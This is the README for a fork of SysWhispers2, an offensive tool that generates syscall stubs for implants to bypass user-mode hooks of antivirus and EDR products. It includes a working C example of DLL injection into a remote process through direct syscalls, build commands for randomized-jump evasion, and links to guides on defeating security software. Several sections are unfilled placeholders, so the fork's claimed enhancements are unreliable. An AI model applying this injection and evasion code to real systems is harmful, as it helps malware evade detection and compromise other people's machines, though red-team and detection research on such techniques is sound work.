## 🚀 SysWhispers2

🔧 SysWhispers2 helps with evasion by generating header/ASM files that implants can use to make direct system calls, bypassing user-mode hooks. This fork includes addi customizations and improvement.


## 🔑 Key Differences from Original SysWhispers2
  ✅ Enhanced Features: [Describe modifications, e.g., "Added support for XYZ syscalls."]
  
  ✅ Compatibility: [Mention extended OS/toolchain support.]
  
  ✅ Optimizations: [Highlight performance/usability improvements.]

## 🛠 Features

✔ Generates header/ASM files for direct syscalls.

✔ Supports all core syscalls with cross-version compatibility.

✔ Randomized function name hashes for evasion.

✔ Lightweight & easy integration.

## 📥 Installation
      git clone https://github.com/your-username/SysWhispers2.git
      cd SysWhispers2
    python syswhispers.py --help
    
## 🚦 Usage Examples
  🔹 Generate Common Syscalls
  
    python syswhispers.py --preset common -o syscalls_common
    
  🔹 Generate Custom Syscalls

    python syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem
    
  🔹 Example: DLL Injection with Direct Syscalls
  c
    
    #include "syscalls.h" // Generated header
    void InjectDll(HANDLE hProcess, const char* dllPath) {
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = nullptr;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
    }
    
## 📜 Supported Functions
  Using --preset common includes:

  - NtCreateProcess

  - NtOpenThread

  - NtReadVirtualMemory

  - NtAllocateVirtualMemory

  - ... and more.

<details> <summary>📂 Click to expand full list</summary>
[Include the same list as in the original README or update it if needed.]

</details>
🔌 Integration
Visual Studio
Copy generated files (*.h, *.c, *.asm) into your project.

Enable MASM in Project → Build Customizations.

Add files and configure platform settings (x86/x64).

# MinGW + NASM

    # x86 Example
    i686-w64-mingw32-gcc -c main.c syscalls.c -Wall -shared
    nasm -f win32 -o syscalls.x86.o syscalls.x86.nasm
    i686-w64-mingw32-gcc *.o -o output.exe
    Random Syscall Jumps (Evasion)
    Compile with -DRANDSYSCALL and use rnd ASM files:


    x86_64-w64-mingw32-gcc main.c syscalls.c syscalls.rnd.x64.s -DRANDSYSCALL -Wall -o output.exe
    

### Script Output

```
PS C:\Projects\SysWhispers2> py .\syswhispers.py --preset common --out-file syscalls_common

python syswhispers.py -p all -a all -l all -o example-output/Syscalls

                  .                         ,--.
,-. . . ,-. . , , |-. o ,-. ,-. ,-. ,-. ,-.    /
`-. | | `-. |/|/  | | | `-. | | |-' |   `-. ,-'
`-' `-| `-' ' '   ' ' ' `-' |-' `-' '   `-' `---
     /|                     |  @Jackson_T
    `-'                     '  @modexpblog, 2021

SysWhispers2: Why call the kernel when you can whisper?

All functions selected.

Complete! Files written to:
        example-output/Syscalls.h
        example-output/Syscalls.c
        example-output/SyscallsStubs.std.x86.asm
        example-output/SyscallsStubs.rnd.x86.asm
        example-output/SyscallsStubs.std.x86.nasm
        example-output/SyscallsStubs.rnd.x86.nasm
        example-output/SyscallsStubs.std.x86.s
        example-output/SyscallsStubs.rnd.x86.s
        example-output/SyscallsInline.std.x86.h
        example-output/SyscallsInline.rnd.x86.h
        example-output/SyscallsStubs.std.x64.asm
        example-output/SyscallsStubs.rnd.x64.asm
        example-output/SyscallsStubs.std.x64.nasm
        example-output/SyscallsStubs.rnd.x64.nasm
        example-output/SyscallsStubs.std.x64.s
        example-output/SyscallsStubs.rnd.x64.s
        example-output/SyscallsInline.std.x64.h
        example-output/SyscallsInline.rnd.x64.h
```


## Related Articles and Projects

- [@modexpblog](https://twitter.com/modexpblog): [Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)
- [@hodg87](https://twitter.com/hodg87): [Malware Mitigation when Direct System Calls are Used](https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/)
- [@Cn33liz](https://twitter.com/Cneelis): [Combining Direct System Calls and sRDI to bypass AV/EDR](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) ([Code](https://github.com/outflanknl/Dumpert))
- [@0x00dtm](https://twitter.com/0x00dtm): [Userland API Monitoring and Code Injection Detection](https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565)
- [@0x00dtm](https://twitter.com/0x00dtm): [Defeating Userland Hooks (ft. Bitdefender)](https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496) ([Code](https://github.com/NtRaiseHardError/Antimalware-Research/tree/master/Generic/Userland%20Hooking/AntiHook))
- [@mrgretzky](https://twitter.com/mrgretzky): [Defeating Antivirus Real-time Protection From The Inside](https://breakdev.org/defeating-antivirus-real-time-protection-from-the-inside/)
- [@SpecialHoang](https://twitter.com/SpecialHoang): [Bypass EDR’s memory protection, introduction to hooking](https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6) ([Code](https://github.com/hoangprod/AndrewSpecial/tree/master))
- [@xpn](https://twitter.com/_xpn_) and [@domchell](https://twitter.com/domchell): [Silencing Cylance: A Case Study in Modern EDRs](https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/)
- [@mrjefftang](https://twitter.com/mrjefftang): [Universal Unhooking: Blinding Security Software](https://threatvector.cylance.com/en_us/home/universal-unhooking-blinding-security-software.html) ([Code](https://github.com/CylanceVulnResearch/ReflectiveDLLRefresher))
- [@spotheplanet](https://twitter.com/spotheplanet): [Full DLL Unhooking with C++](https://ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)
- [@hasherezade](https://twitter.com/hasherezade): [Floki Bot and the stealthy dropper](https://blog.malwarebytes.com/threat-analysis/2016/11/floki-bot-and-the-stealthy-dropper/)
- [@hodg87](https://twitter.com/hodg87): [Latest Trickbot Variant has New Tricks Up Its Sleeve](https://www.cyberbit.com/blog/endpoint-security/latest-trickbot-variant-has-new-tricks-up-its-sleeve/)


## References to SysWhispers

- [@JFaust_](https://twitter.com/JFaust_): Process Injection [Part 1](https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/), [Part 2](https://sevrosecurity.com/2020/04/13/process-injection-part-2-queueuserapc/), and [Alaris loader](https://sevrosecurity.com/2020/10/14/alaris-a-protective-loader/) project ([Code](https://github.com/cribdragg3r/Alaris))
- [@0xPat](https://www.twitter.com/0xPat): [Malware Development Part 2](https://0xpat.github.io/Malware_development_part_2/)
- [@brsn76945860](https://twitter.com/brsn76945860): [Implementing Syscalls In The CobaltStrike Artifact Kit](https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/)
- [@Cn33liz](https://twitter.com/Cneelis) and [@_DaWouw](https://twitter.com/_DaWouw): [Direct Syscalls in Beacon Object Files](https://outflank.nl/blog/2020/12/26/direct-syscalls-in-beacon-object-files/) ([Code](https://github.com/outflanknl/InlineWhispers))
    
## ⚠️ Caveats
  ❌ Graphical subsystem syscalls (win32k.sys) are not supported.
  
  ❌ Tested on [Your Environments].

## Troubleshooting

  - Type redefinitions errors: a project may not compile if typedefs in `syscalls.h` have already been defined.
  - Ensure that only required functions are included (i.e. `--preset all` is rarely necessary).
  - If a typedef is already defined in another used header, then it could be removed from `syscalls.h`.
    
## 🙏 Credits
   Based on the original SysWhispers2 by @Jackson_T and @modexpblog.
   Additional contributions by Mangala-Mnmatharaja🎯.

## 📜 License
Apache License 2.0. See LICENSE[http://www.apache.org/licenses/] for details.
